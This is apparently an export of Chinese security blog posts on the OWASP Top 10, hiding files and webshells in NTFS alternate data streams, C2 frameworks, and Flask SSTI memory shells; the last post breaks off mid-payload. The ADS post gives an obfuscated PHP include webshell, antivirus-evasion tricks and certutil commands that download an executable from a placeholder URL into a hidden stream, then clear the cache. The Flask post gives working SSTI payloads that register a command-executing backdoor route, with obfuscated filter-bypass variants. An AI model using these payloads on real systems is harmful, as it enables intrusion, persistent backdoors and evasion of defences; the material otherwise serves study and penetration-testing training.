[{"title":"2021 OWASP TOP 10","url":"/2025/08/05/2021%20OWASP%20TOP%2010/","content":"近些年漏洞的威胁分类也发生了很大变化，王道SQL注入也慢慢淡出历史的舞台，最新OWASP Top Ten | OWASP Foundation版，分类和排名都变化了很多\n\n[TOP1]失效的访问控制访问控制失效指的是：系统没有正确限制用户访问资源或功能，导致用户可以访问本不该访问的内容或操作\n具体的例子：用户越权访问\n用户 A 修改自己的资料：\n\nPOST /api/user/update?id=1001\n\n\n他把 ID 改成了管理员的 ID：\n\nPOST /api/user/update?id=1\n\n\n没有权限校验？那就直接修改管理员信息成功了\n\n水平越权普通用户访问了其他用户的数据，比如：\nGET /api/orders/123456\n\n→ 返回了别人的订单信息（严重泄露）\n垂直越权普通用户调用了管理员接口：\nPOST /api/admin/delete_user?id=2\n\n如果没检查角色权限，就能直接删号\n前端控制误信前端隐藏了按钮，认为“用户就点不到”：\n&lt;!-- 管理员按钮 --&gt;&lt;button style=&quot;display: none&quot;&gt;删除用户&lt;/button&gt;\n\n然而攻击者直接 F12 改代码，照样能点\n[TOP2]加密机制失效它其实是以前叫做“敏感数据暴露（Sensitive Data Exposure）”的进化版，专门指：加密没做好 or 该加密却没加密，导致敏感信息暴露\n什么叫“加密机制失效”？就是本来你用了加密，结果：\n\n用错算法了\n密钥管理乱套了\n加密流程瞎写\n本该加密的地方压根没加密\n\n结果攻击者轻轻松松就拿到敏感数据：密码、银行卡、身份信息、Token、session、甚至数据库内容……\n常见的失效方式：\n\n\n错误类型\n示例\n\n\n\n使用弱加密算法\n使用 MD5&#x2F;SHA1 加密密码\n\n\n明文传输敏感信息\n登录时通过 HTTP 提交用户名密码\n\n\n明文存储敏感数据\n数据库里直接存储身份证、手机号等\n\n\n加密后泄露密钥\n把密钥写在代码里、GitHub里\n\n\n没有加密\n比如 Cookie 没有设置 Secure + HttpOnly\n\n\n错误的加密流程\n密文没有加随机盐、IV 被复用等\n\n\n攻击者怎么利用\n截获未加密的 HTTP 请求，拿到账号密码。\n拿到数据库后用字典暴力破解 MD5 加密的密码。\n从前端源码或 Git 泄漏中拿到 AES 密钥解密所有数据。\n复用泄漏的 JWT Token 冒充他人身份\n\n[TOP3]注入最经典的一集\n什么是注入漏洞（Injection）？就是应用程序把用户输入当成代码或命令执行了，攻击者通过构造恶意输入，控制程序行为，从而实现：\n\n执行任意命令\n查询&#x2F;篡改&#x2F;删除数据库\n提权、越权\n甚至远程控制服务器\n\n常见的注入类型\n\n\n类型\n简介\n\n\n\nSQL 注入\n向数据库查询语句中注入恶意 SQL 代码\n\n\n命令注入\n向系统命令中注入恶意命令\n\n\nLDAP 注入\n向 LDAP 查询语句中注入内容\n\n\nXPATH 注入\n攻击 XML 查询逻辑\n\n\nNoSQL 注入\n攻击 MongoDB、Redis 等非关系型数据库\n\n\n表达式注入\n如 SpEL、OGNL 等框架表达式被执行\n\n\nORM 注入\n即使用了 ORM 框架，但拼接查询也能被注入\n\n\n[TOP4]不安全的设计不安全的设计指的是：在系统架构、业务流程、功能逻辑上，一开始就没有考虑安全，导致再怎么加补丁也“补不住”。  \n 它和“实现缺陷”不同，强调的是设计阶段的安全问题，而不是代码实现时的小失误\n举个栗子：例1：没有验证码\n登录接口无限试错 → 被爆破了\n注册接口被批量打脚本 → 被刷号了\n\n例2：密码重置只用邮箱地址就能触发\n没有身份验证 → 轻松盗号\n\n例3：未做权限分离的业务逻辑\n所有人都能访问 /admin/delete_user?id=1\n\n例4：可预测的文件上传路径\n上传文件保存为 /upload/&#123;用户名&#125;.jpg\n恶意访问 /upload/admin.jpg 直接泄露敏感资源\n\n[TOP5]安全配置错误什么是“安全配置错误”？安全配置错误是指：系统、框架、服务器、数据库等组件的默认配置太危险，或者运维部署过程中配置疏忽、遗漏，导致被攻击者利用的情况。\n一不小心就把“后门”留给了黑客\n常见的配置错误示例：\n\n\n类型\n示例\n\n\n\n默认密码未修改\nadmin&#x2F;admin、root&#x2F;root、123456\n\n\n目录&#x2F;文件暴露\n.git/、/backup.zip、/WEB-INF/可访问\n\n\n错误信息泄露\n报错页面暴露堆栈、路径、数据库结构等\n\n\n开启调试模式\nFlask 的 debug=True，Spring Boot 的 actuator\n\n\n开放未使用端口\nRedis、Elasticsearch、MongoDB 未授权访问\n\n\n跨域配置不当\nCORS 允许任意来源：Access-Control-Allow-Origin: *\n\n\n缺少 HTTP 安全头\n没设置 X-Content-Type-Options, X-Frame-Options 等\n\n\nTLS 配置弱\n使用 SSL3.0、弱密码套件、没有证书校验\n\n\n容器或云服务配置问题\nDocker 映射敏感目录、云 bucket 设置成公开可读写\n\n\n[TOP6]自带缺陷和过时的组件什么是“自带缺陷和过时的组件”？指的是：你的项目中依赖了有已知漏洞的软件组件、库、框架、服务，但你却没有及时更新、替换或做防护，攻击者一看版本就知道怎么打。\n也叫：\n\n第三方组件漏洞\n供应链安全问题的一种\n\n常见的“有毒”组件例子：\n\n\n类型\n漏洞例子\n危害\n\n\n\nWeb框架\nStruts2（S2-045）\n远程命令执行\n\n\nJS库\njQuery &lt;1.9\nXSS 漏洞\n\n\nJava依赖\nlog4j（Log4Shell）\n任意代码执行\n\n\nPython包\nrequests 老版本\nSSL验证绕过\n\n\nNode库\nlodash、express 老版本\n多种原型链污染\n\n\nCMS系统\nWordPress 插件漏洞\n任意文件上传、SQL注入\n\n\n只要我们获得了某个组件的版本，就可以用https://www.exploit-db.com/去查找对应的 exp\n当然有时 exp 会不奏效，我们可以根据实际情况对 exp 进行修改\n[TOP7]身份识别和身份验证错误什么是“身份识别与身份验证错误”？指的是系统在识别用户身份或验证用户合法性的机制上设计不当、实现出错，导致攻击者可以伪装他人、绕过登录、劫持账号、撞库成功等\n具体表现有哪些？\n\n\n类别\n示例\n危害\n\n\n\n弱密码策略\n可以设置 123456 或 admin\n被撞库&#x2F;穷举轻松成功\n\n\n无登录限制\n登录接口无限尝试密码\n爆破成功，账户被盗\n\n\n验证码缺失&#x2F;可绕过\n验证码固定、简单或能跳过\n自动化暴力攻击\n\n\nSession管理不当\nToken 泄露、过期机制缺失\n会话固定、劫持\n\n\n身份验证信息明文传输\nHTTP 明文传用户名&#x2F;密码\n被中间人攻击窃取\n\n\n多因子认证缺失\n仅靠密码验证\n易被撞库或钓鱼攻击\n\n\n身份切换不安全\n登录后修改参数切换为他人身份\n水平越权或账号接管\n\n\n[TOP8]软件和数据完整性故障什么是“软件和数据完整性故障”？指的是：系统在运行过程中依赖的软件、配置、代码或数据，没有进行完整性校验或校验机制被绕过，攻击者就可以篡改这些内容，进而控制系统。\n简而言之：你信任的东西被“偷偷动手脚”了，但你没检查\n常见攻击场景\n\n\n类型\n示例\n后果\n\n\n\n供应链投毒\n**开发依赖了被挂马的 NPM 包（如 ****event-stream**）\n项目编译就中毒，攻击者远控系统\n\n\n自动更新缺乏签名验证\n软件启动时更新 **.exe** 没做签名校验\nMITM 劫持替换为木马\n\n\nCI&#x2F;CD 脚本可被注入\n发布脚本中引用外部 Bash&#x2F;Python 脚本\n远程代码执行、上传后门\n\n\n缺少完整性校验\n静态文件未设置 Hash，容易被篡改\n攻击者插入恶意 JS&#x2F;XSS\n\n\nDocker 镜像来源不明\n使用了不可信的第三方镜像\n镜像自带恶意服务或后门账号\n\n\n[TOP9]安全日志和监控故障什么是“安全日志和监控故障 ”？安全日志和监控故障是指系统未能妥善记录安全相关事件，或者在发生攻击或异常时未能及时检测与响应，导致攻击行为未被发现或延迟应对，从而扩大损害范围。\n常见表现\n系统关键操作没有记录日志，如登录、权限变更、敏感数据访问。\n日志记录过于简单或不一致，缺乏时间戳、用户标识、IP 信息等。\n日志没有集中存储或无法追踪。\n未部署 SIEM（安全信息与事件管理）系统或告警规则缺失。\n日志被攻击者删除或篡改后无恢复机制。\n发生攻击时无自动响应机制（如封锁 IP、断开连接等）。\n\n实际危害\n攻击滞后发现：例如 Webshell 被植入服务器几个月都未被察觉。\n取证困难：无法还原攻击路径，影响溯源与司法调查。\n监管不合规：如金融、医疗等行业必须满足日志留存合规要求。\n扩大损害：攻击者反复尝试暴力破解或横向移动而不被发现。\n\n[TOP10]服务器端请求伪造(SSRF)什么是“服务器端请求伪造(SSRF) ”？SSRF 是指攻击者诱使 服务器端发起请求，目标通常是：\n\n内网服务（如 http://127.0.0.1:2375）\n云服务元数据接口（如 AWS 的 http://169.254.169.254/latest/meta-data/）\n其他本不应被访问的地址\n\n攻击原理：攻击者控制请求地址，让服务器代为访问：\nPOST /fetch?url=http://169.254.169.254/latest/meta-data/iam/\n\n服务端拿这个 URL 去请求，就泄露了内部数据。\n检测方法（实战技巧）：\n使用 burp 修改参数试探内网 IP，如：\n\nurl=http://127.0.0.1:80/url=http://localhost:2375/url=http://169.254.169.254/\n\n\n利用 DNSlog 验证是否存在请求发出\n用 Gopher 协议构造 Redis 注入等高级 SSRF\n\n延伸场景（云原生）：\nSSRF 是打穿云平台、K8S 集群、获取云凭证的第一步\n可与 RCE、反序列化、身份提升等漏洞组合使用，形成 链式攻击\n\n**— **\nOWASP Top 10 总结了当今最常见且最严重的 Web 安全风险，涵盖了访问控制失效、加密机制薄弱、注入攻击、设计缺陷、配置错误、使用过时组件、身份验证问题、完整性缺失、日志监控不足以及服务器端请求伪造等各个层面。了解这些风险的原理、成因和防护方式，有助于开发者、运维人员与安全工程师在系统设计与实现过程中构建更加健壮、可信赖的应用程序。安全不是一次性的操作，而是一个持续演进的过程。只有将安全理念融入整个软件生命周期，才能真正有效降低攻击面，提升整体防护水平。  \n","tags":["web安全"]},{"title":"ADS数据流实现隐藏文件","url":"/2025/07/24/ADS%E6%95%B0%E6%8D%AE%E6%B5%81%E5%AE%9E%E7%8E%B0%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6/","content":"ADS：Alternate DataStreams，全称 NTFS 交换数据流，是 NTFS 磁盘格式的一个特性，在 NTFS 文件系统下，每个文件都可以存在多个数据流。简单来说，就是其他文件可以寄宿在某个文件身上。利用 ADS 数据流可以做很多有趣的事情\n在NTFS分区创建ADS数据流文件有两种形式：\n\n一是指定宿主文件；\n二是创建单独的ADS文件。\n\n创建的指令有两个：echo 和 type\n\necho 用于常规字符\ntype 用于将文件附加到某个文件\n\n使用方法1. 使用宿主文件echo test &gt; 1.txt:flag.txt\n正常用 dir 是无法查看到的，可以使用 dir &#x2F;r\nC:\\test&gt;dir 驱动器 C 中的卷没有标签。 卷的序列号是 46BD-3363 C:\\test 的目录2025/07/22  03:53    &lt;DIR&gt;          .2025/07/22  03:53    &lt;DIR&gt;          ..2025/07/22  03:53                 0 1.txt               1 个文件              0 字节               2 个目录 45,771,202,560 可用字节C:\\test&gt;dir /r 驱动器 C 中的卷没有标签。 卷的序列号是 46BD-3363 C:\\test 的目录2025/07/22  03:53    &lt;DIR&gt;          .2025/07/22  03:53    &lt;DIR&gt;          ..2025/07/22  03:53                 0 1.txt                                  9 1.txt:flag.txt:$DATA               1 个文件              0 字节               2 个目录 45,771,161,600 可用字节\n文件内容可以使用命令\nnotepad 1.txt:flag.txt\n此类文件可以通过直接删除宿主文件清除。\n2. 单独的 ADS 数据流文件这类可以通过以下命令来创建：\necho hide &gt; :mo.txt\n创建后该目录内是没有文件的，并且用当前目录下的命令行也无法查看，因为它是依赖于文件夹的ADS数据流文件\n因此需要退到上一级目录去查看\ncd ../notepad test\n\nwebshell后门由于 Windows 系统对 ADS 文件都没有执行权限，因此隐藏此类 webshell 需要用到文件包含来配合\n首先创建一个被包含文件：index.php:mo.txt\n在里面藏一个 phpinfo\necho ^&lt;?php phpinfo();?^&gt; &gt; index.php:mo.txt\n\n为了避免被查，给文件名进行 hex 编码，最后创建一个实现文件包含功能的 include.php \n&lt;?php$a=&quot;696E6465782E7068&quot;.&quot;703A6D6F2E747874&quot;;$b=&quot;a&quot;;include(PACK(&#x27;H*&#x27;,$$b))?&gt;\n\n文件上传当然这里也可以借助此数据流实现 Bypass 上传黑名单限制\n当我们上传数据流文件时，形如 test.php::$DATA 、test.php:a.txt 这样的后缀， windows 系统就会需要创建一个对应的宿主文件 test.php ，同时假设我们需要上传的文件内容为：\n&lt;?php phpinfo();?&gt;\n\n根据上传文件名不同，会产生不同效果\ntest.php:a.jpg\n效果：生成 test.php，文件内容为空\ntest.php::$DATA\n效果：生成 test.php, 文件内容为 &lt;?php phpinfo();?&gt;\ntest.php::$INDEX_ALLOCATION\n效果：生成 test.php 文件夹\ntest.php::$DATA\\0.jpg\n效果：生成 0.jpg，文件内容为 &lt;?php phpinfo();?&gt;\n上传文件名为 Test.php::$INDEX_ALLOCATION 时会生成对应的文件夹，那么以理论上来说是可以用于突破 UDF 提权时无法创建文件夹的问题，但是我测试的时候并不可以，不知道是为什么，严重怀疑被参考文献骗了┭┮﹏┭┮\n病毒免杀windows的数据流文件都被禁止了执行权限，因此可以使用 wscript 来运行 vbs，在C盘的根目录使用命令：\ntype 1.vbs &gt; :2.vbs\n可以创建 C 盘存在的数据流文件 c::2.vbs，没有工具是无法清除的，而且也可以绕过部分安全厂商的查杀\n这个 vbs 文件也是可以运行的\nwscript c::2.vbs\ndll 文件同理：\ntype test.dll &gt; 1.txt:msregsvr32 1.txt:ms\n\n清除方式：用winhex或者删除宿主文件或者借助相关工具如 IceSword 也可进行删除。\n实战通过文件上传执行在 C:\\WINDOWS\\debug\\WIA 的目录下（这个目录常被用于 Dropper（下发payload）或免杀执行）\n上传文件到 ADS 数据流\n$upload /tmp/beacon.exe \\\\.\\c:\\WINDOWS\\debug\\WIA\\test:aa.exe\n\n执行\n$wmic process call create \\\\.\\c:\\WINDOWS\\debug\\WIA\\test:aa.exe$execute -cH -f &quot;\\\\\\\\.\\\\c:\\\\WINDOWS\\\\debug\\\\WIA\\\\test:aa.exe&quot; (也可以使用msf来执行)\n\n通过文件下载执行利用 certutil 从 HTTP 下载一个文件并直接写入目标 ADS\n$certutil -urlcache -split -f http://url/test.exe \\\\.\\c:\\WINDOWS\\debug\\WIA\\test:aa.exe\n\n删除certutil缓存\n$certutil.exe -urlcache -split -f http://url/test.exe delete\n\n进一步隐藏如果想要 dir&#x2F;s 里看不到 ADS，可以使用特殊的文件名称：\n\\\\.\\C:\\test\\COM1\\\\.\\C:\\test\\COM2\\\\.\\C:\\test\\COM3-8\\\\.\\C:\\test\\COM9\\\\.\\C:\\test\\nul\n\n并且这些文件是不可以直接在UI界面删除的，要删除的话使用如下命令：\ndel \\\\.\\C:\\test\\nul\n\n","tags":["web安全"]},{"title":"C2框架解析","url":"/2025/07/28/C2%E6%A1%86%E6%9E%B6%E8%A7%A3%E6%9E%90/","content":"C2 框架的发展历史摘自https://daffodi11.github.io/post/hong-dui-wu-qi-yan-fa-chang-shi-shi-xian-yi-ge-xian-dai-c2-kuang-jia-daffodilc2/\n最早且广为人知的C2(command&amp;control)框架可能是第一代的灰鸽子,采用客户端“主动连接”的方式,即客户端在主机A执行后，客户端监听，在服务端输入主机A的IP与端口后，才能进行通讯。  后来因为内网环境与防火墙的因素，发展出了“被动连接”方式的第二代C2框架，例如GHOST、大灰狼，与“主动连接”相反，即服务端监听，客户端主动连接服务端。此时出现了两种配置方式，一是FTP上线、二是域名解析上线。有效适应大多数网络环境,但易溯源、网络数据包易被提取特征、不易于现代红队协同使用。  为了解决这些问题，发展出了第三代C2框架例如cobalt strike,它支持HTTP、HTTPS、DNS等协议通讯,由TeamServer转发请求,隐秘性好、易于扩展、适合现代红队协同工作,如今被广泛使用。\n\n什么是 C2C2（Command and Control）是指在单个或一组目标受害者主机上建立和维持对植入工具的控制的过程。C2框架通常提供借助某个通信协议与植入工具进行通信的能力，向受害者系统发出命令，并且在C2服务器上接收这些命令的输出，使攻击者实现物理访问或直接的虚拟访问。\nC2 协议依赖于每个受控植入工具和 C2 服务器之间的同步或异步通信信道\n首先先介绍一些架构的基础知识\nC/S架构：Clinet/Server,主要指的是TCP，客户端和服务端，即便带个中转它也还是叫C/S架构B/S架构: Browser/Server,主要是HTTP，无论直接通过浏览器操作，还是像CS加个中转再用客户端访问RAT：Remote Admin Tools，远程管理工具，长期以来国内外通用叫法。C2: command&amp;control，从字面上就很好理解命令和控制，现在新叫法。不管任何协议，木马都可这样叫。\n\nCobalt Strike 采用的是 C&#x2F;S 架构，由 GUI 客户端连接远程的 TeamServer 实现控制。被控端（Beacon）以异步方式通过 HTTP&#x2F;HTTPS&#x2F;DNS 等协议回连 TeamServer，形成 implant 与 C2 的通信通道。  \n\n控制端 → TeamServer：专用协议（非 HTTP）  \nBeacon → TeamServer：HTTP&#x2F;HTTPS&#x2F;DNS 等协议\n\n从本质上来说，Metasploit 也是一个 C2 框架，是一个标准的 C&#x2F;S 架构，而 Meterpreter 是 Metasploit 的核心 implant。Meterpreter 是一个非常典型的 被控代理（agent），它默认是异步通信模型，通信协议支持：\n\nTCP（反弹）\nHTTP&#x2F;HTTPS（绕过代理和防火墙）\nStaged 和 Stageless 模式\n\nC2 的优势众所周知 C2 是用在后渗透上的，那么我们为什么要用 C2 框架进行后渗透呢？\n我们可以将 C2 的功能和 netcat 进行对比\n相比于普通的Netcat侦听器，C2框架可能具有更多的功能、灵活性和隐蔽性；C2框架可以针对shell提供更好的会话管理功能，能够让我们很方便地管理和操作多个远程shell\nC2 的基本结构C2 ServerC2服务器能够充当代理回调的中心，C2代理将定期和C2服务器联系并等待操作员的命令\nAgents &#x2F; PayloadsC2代理出现在目标系统感染之后，它运行在目标系统上，并且能够接受C2服务器的控制命令并执行，起代理作用。\n与标准的反向shell相比，C2代理在大多数情况下还能够支持一些特殊功能，大多数C2框架都实现了伪命令，这可以简化C2操作人员的工作\nbeacon的流量特征可通过Malleable-C2-Profiles定制，从而能在一定程度上规避安全性检测。\nListeners侦听器是运行在C2服务器上的一种应用程序，它将会等待通过特定端口或协议进行的回调操作，相关的协议可以是DNS、HTTP和HTTPS 等\nBeaconsBeacon(信标)是指 C2 代理回调在 C2 服务器上运行的侦听器的过程，它是一种恶意软件与 C2 服务器之间的定期通信方式(通信机制)\n当恶意软件感染目标系统，需要与控制服务器(C2服务器)建立连接，但是C2服务器不会持续发出命令，所以恶意软件就需要采取一定机制定期与C2服务器通信，并确认连接状态和获取新命令，这个过程可以通过 Beacon 进行\n Beacon通信的主要特征是: \n\n定期性：保持定期的通信间隔，比如每隔30秒到5分钟不等； \n短小报文：通常只传输少量信息，比如恶意软件ID、主机地址等； \n加密传输：使用自定义加密算法对通信内容进行加密，避免被检测； \n命令获取：在有新命令时获取命令，在没有新命令时只发送确认连接的报文。\n\n Beacon通信的目的主要有两个: \n\n确认连接：定期通信可以确认恶意软件与C2服务器的连接是否正常，如果长时间未通信可能代表连接出现问题； \n获取命令：在有新命令或更新时可以通过Beacon通信将其下发到恶意软件，然后用于控制受害系统。\n\n混淆代理回调Jitter众所周知，C2 的流量有一个特征就是beacon通信以及被控制的设备向C2服务器发送beacon报文的速率，简单来说，默认的 beacon 通信会使用一个时间固定的睡眠周期，这个周期默认为 60 秒\n这时候可以用 Jitter 时序扰动，在使用 Jitter 之后，我们的 C2 beacon 通信将可能呈现出一种无规律的模式，显示出的活动会更接近于普通用户\n在一些更高级的 C2 框架中，我们还可以更改一些参数来增加流量的隐蔽性，并且也可以在正在传输的文件添加垃圾数据，从而使得该文件的隐蔽性增加。\nFile JitterFile Jitter 简单来说就是通过文件操作来实现恶意软件与 C2 服务器通信时间的随机变化\n “File” Jitter的实现过程通常如下所示：\n\n恶意软件首先会确定一个命令目录，C2服务器会在该目录下放置命令文件； \n恶意软件设置一个基础等待时间，比如30秒，这会是检测新命令文件的默认时间间隔； \n每次恶意软件醒来后，它首先检查命令目录下是否有新文件，如果有，则读取文件并删除，从而获取到新命令；\n如果命令目录下没有新文件，那么恶意软件会在20到40秒(可自行设置)的随机时间范围内等待，此处需要引入Jitter； \n在等待时间结束后，恶意软件将再次检查命令目录下是否有新文件 并将循环以上过程。\n\n“File” Jitter将利用文件操作来触发通信和获取新命令；使用命令文件可以更好隐藏通信规律，从而避免直连型的恶意网络通信被检测到。\n有效载荷就像常规的反弹 shell 一样，你可以在 C2 框架中使用两种主要类型的有效载荷：无阶段有效载荷和分阶段有效载荷\n无阶段有效载荷无阶段有效载荷是两者中最简单的，他们将包含完整的 C2 代理，并将回调 C2 服务器时立即开始 beacon 通信过程\n分阶段有效载荷分阶段有效载荷需要回调到 C2 服务器以下载 C2 代理的其他部分，这个过程可以更容易的混淆代码以绕过反病毒程序\n 使用分阶段有效载荷建立C2 beacon(信标)的步骤如下： \n\n受害者下载并执行Dropper(Dropper是用于在目标系统上安装其他恶意软件或工具的恶意程序，比如可以安装C2代理、远控工具等)； \nDropper回调到C2服务器以下载第二阶段的有效载荷； \nC2服务器将第二阶段的有效载荷发送回受害者工作站；\n第二阶段的有效载荷被加载到受害者工作站的内存中； \nC2 beacon(信标)初始化，红队&#x2F;威胁参与者可以在C2服务器上与受害者机器进行互动。\n\n有效载荷格式Windows PE文件(一种Windows可执行文件格式)并不是在系统上执行代码的唯一方式，一些C2框架也可支持其他格式的有效载荷，例如： \nPowerShell脚本：它可能包含c#代码(这可以用Add-Type Commandlet来编译和执行)；HTA文件； JScript文件； Visual Basic应用程序或Visual Basic脚本； Microsoft Office文档；\n模块模块是任何C2框架的核心组件，它们能够添加一些使C2代理和C2服务器更加灵活的功能\nPost Exploitation Modules(后渗透模块)Post Exploitation(后渗透)模块是C2框架的主要组件之一，该模块可用于处理获得目标机的初始访问权限之后的任何事情，使用后渗透模块可以像运行SharpHound工具一样简单，也可以像转储LSASS和解析内存中的凭证一样复杂，此外，我们还能用后渗透模块中的ps1(Powershell)脚本来查找横向移动路径。\nPivoting Modules(跳板模块)pivoting(跳板)模块是C2框架的主要组件之一，当我们使用C2框架时，该模块能够让我们更加容易地去访问受限制的网段。如果你在目标网络中的某个系统A(A在非限制网段中)上具有管理员访问权限，那么你就可以打开“SMB Beacon”通信，它可以使计算机A通过SMB协议充当一个代理；这将可能允许受限制网段中的机器与你的C2服务器实现通信\n\n参考文献：https://www.cnblogs.com/Hekeats-L/p/17346694.html\n","tags":["内网渗透"]},{"title":"python 内存马","url":"/2025/07/21/python%E5%86%85%E5%AD%98%E9%A9%AC/","content":"之前一直想学内存马，但是碍于对 java 的了解近乎为0，对jndi的了解也是只停留在会背面经的层面，所以一直没有去学，直到后来翻一些文章发现 python 也可以利用 SSTI 进行内存马注入，于是迅速开整\nFlask常见的 Python Web 框架如 Django 和 Flask 都有可能存在 SSTI（Server-Side Template Injection，服务端模板注入）漏洞\n在 Flask 中，使用 render_template_string() 渲染模板时，若将用户输入直接传入而未做过滤处理，就可能导致 SSTI 漏洞。攻击者可通过该漏洞注入恶意模板代码，从而实现 代码执行，甚至进一步植入 内存马\n内存马注入原理（Flask 路由机制）Flask 常规注册路由的方式是通过装饰器 @app.route()，但底层实际是调用了：\nself.add_url_rule(rule, endpoint=None, view_func=None)\n\n各参数说明如下：\n\nrule：URL 路径（必须以 / 开头），与 @app.route() 中的路径一致\nendpoint：视图函数的唯一标识，在使用 url_for() 反向生成 URL 时会用到，默认为函数名\nview_func：绑定的视图函数（关键参数），可以是函数名，也可以是匿名函数（lambda）\n\n 因此，只要能通过 SSTI 或其他 RCE 手段执行 add_url_rule() 并注入恶意 view_func，就可以动态注册一个后门路由，实现命令执行或内存马植入。 \nFlask 上下文机制（Context）要动态注册路由并执行命令，核心在于控制 **view_func** 的行为。通常可使用 匿名函数 lambda 来实现远程命令执行：\nlambda: os.popen(request.args.get(&#x27;cmd&#x27;)).read()\n\n这需要依赖 Flask 的上下文机制（Context）：\nFlask 中的上下文分为两类：\n\n请求上下文（Request Context）：包含请求相关的数据，如 request, session, g 等\n应用上下文（Application Context）：包含全局应用状态，如 current_app, app 等\n\n 当一个 HTTP 请求进入 Flask 应用时，Flask 会自动：  \n\n实例化一个 Request Context\n**Request Context **包含在 Request 对象中，并被推入 _request_ctx_stack 栈结构\n获取当前请求对象，即可通过 _request_ctx_stack.top 获取当前上下文\n\n这使得我们在构造 payload 时，能访问如 request, app, os 等对象并执行逻辑\n漏洞环境这里我们从 https://xz.aliyun.com/news/10381 这篇文章找一个漏洞环境 demo 来实验\nfrom flask import Flask, request, render_template_stringapp = Flask(__name__)@app.route(&#x27;/&#x27;)def hello_world():  # put application&#x27;s code here    person = &#x27;knave&#x27;    if request.args.get(&#x27;name&#x27;):        person = request.args.get(&#x27;name&#x27;)    template = &#x27;&lt;h1&gt;Hi, %s.&lt;/h1&gt;&#x27; % person    return render_template_string(template)if __name__ == &#x27;__main__&#x27;:    app.run()\n\n原始 Flask 内存马 payload：\nurl_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;,&#123;&#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)\n\n我们来分析一下这个 payload\n先将他展开：\n&#123;&#123; url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](  &quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;,  &#123;    &#x27;_request_ctx_stack&#x27;: url_for.__globals__[&#x27;_request_ctx_stack&#x27;],    &#x27;app&#x27;: url_for.__globals__[&#x27;current_app&#x27;]  &#125;) &#125;&#125;\n\n步骤分解：url_for.__globals__\nurl_for 是 Flask 中的函数，而 Python 中函数对象有一个属性叫 __globals__\n所以可以通过 url_for.__globals__ 拿到全局作用域字典\n可以进一步访问到各种内置对象，比如：\n__builtins__[&#39;eval&#39;]\ncurrent_app\n_request_ctx_stack\n\n\n\n执行 eval(...) 代码eval(&quot;app.add_url_rule(...)&quot;)\n\n\n把构造好的 Python 代码字符串传入 eval()，相当于运行：\n\napp.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda: os.popen(cmd).read())\n\n注册后门路由 /shell这句代码的作用就是动态往 Flask 应用注册一个新的路由 /shell：\napp.add_url_rule(    &#x27;/shell&#x27;,          # 路由地址    &#x27;shell&#x27;,           # endpoint 名称    lambda: __import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())\n\n\nlambda: 是匿名函数，作为 view_func\nos.popen(cmd).read() 执行系统命令\n命令从当前请求对象中获取：_request_ctx_stack.top.request.args.get(&#39;cmd&#39;)\n\n执行 payload 后，内存中注册了一个后门：\n你就可以直接访问：\nhttp://localhost:5000/shell?cmd=whoami\n\n获得系统命令的执行结果\n当然了实战肯定是有过滤的，可以先 fenjing 一把梭，梭完再根据 fenjing 的 payload 的 bypass 方法对上面的 payload 进行修改\n我对 bypass 不是很擅长，直接复制粘贴了\n+ url_for可替换为get_flashed_messages或者request.__init__或者request.application.+ 代码执行函数替换, 如exec等替换eval.+ 字符串可采用拼接方式, 如[&#x27;__builtins__&#x27;][&#x27;eval&#x27;]变为[&#x27;__bui&#x27;+&#x27;ltins__&#x27;][&#x27;ev&#x27;+&#x27;al&#x27;].+ __globals__可用__getattribute__(&#x27;__globa&#x27;+&#x27;ls__&#x27;)替换.+ []可用.__getitem__()或.pop()替换.+ 过滤&#123;&#123;或者&#125;&#125;, 可以使用&#123;%或者%&#125;绕过, &#123;%%&#125;中间可以执行if语句, 利用这一点可以进行类似盲注的操作或者外带代码执行结果.+ 过滤_可以用编码绕过, 如__class__替换成\\x5f\\x5fclass\\x5f\\x5f, 还可以用dir(0)[0][0]或者request[&#x27;args&#x27;]或者request[&#x27;values&#x27;]绕过.+ 过滤了.可以采用attr()或[]绕过.+ 其它的手法参考SSTI绕过过滤的方法即可...\n\n这里给出两个变形Payload:\n原Payload\nurl_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.add_url_rule(&#x27;/h3rmesk1t&#x27;, &#x27;h3rmesk1t&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;shell&#x27;)).read())&quot;,&#123;&#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)\n\n变形 payload：\nrequest.application.__self__._get_data_for_json.__getattribute__(&#x27;__globa&#x27;+&#x27;ls__&#x27;).__getitem__(&#x27;__bui&#x27;+&#x27;ltins__&#x27;).__getitem__(&#x27;ex&#x27;+&#x27;ec&#x27;)(    &quot;app.add_url_rule(&#x27;/h3rmesk1t&#x27;, &#x27;h3rmesk1t&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;shell&#x27;, &#x27;calc&#x27;)).read())&quot;,    &#123;        &#x27;_request_ct&#x27;+&#x27;x_stack&#x27;: get_flashed_messages.__getattribute__(&#x27;__globa&#x27;+&#x27;ls__&#x27;).pop(&#x27;_request_&#x27;+&#x27;ctx_stack&#x27;),        &#x27;app&#x27;: get_flashed_messages.__getattribute__(&#x27;__globa&#x27;+&#x27;ls__&#x27;).pop(&#x27;curre&#x27;+&#x27;nt_app&#x27;)    